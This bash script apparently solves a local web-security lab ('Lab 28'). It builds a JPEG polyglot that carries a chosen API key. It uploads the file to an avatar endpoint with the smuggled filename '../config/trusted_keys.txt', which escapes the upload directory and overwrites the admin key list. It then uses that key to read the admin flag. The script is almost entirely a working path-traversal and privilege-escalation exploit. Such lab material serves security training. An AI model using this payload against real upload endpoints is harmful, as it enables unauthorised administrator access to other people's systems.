#!/usr/bin/env bash
# Lab 28 — a valid JPEG whose filename escapes the upload directory and lands
# on the file that decides who is an administrator.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9280}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab28
WORK="$(mktemp -d)"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1; rm -rf "$WORK"' EXIT
KEY="k-pwn-$$"

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# A polyglot: real JPEG magic bytes, then the text the reader will parse.
# It has to be a file, because \xff\xd8\xff is not text in any encoding.
python3 - "$WORK/poly.jpg" "$KEY" <<'PY'
import sys
open(sys.argv[1], "wb").write(b"\xff\xd8\xff\xe0" + f"\n{sys.argv[2]}\n".encode())
PY

send "$SESSION" req_0 --create --set method=POST --set path=/api/avatar \
    --set-file "multipart.file=$WORK/poly.jpg" \
    --set 'multipart.file.filename=../config/trusted_keys.txt' \
    --set multipart.file.content_type=image/jpeg | body >&2; echo >&2

send "$SESSION" req_0 --create --set path=/api/admin/flag \
    --set "header.X-Api-Key=$KEY" | flag
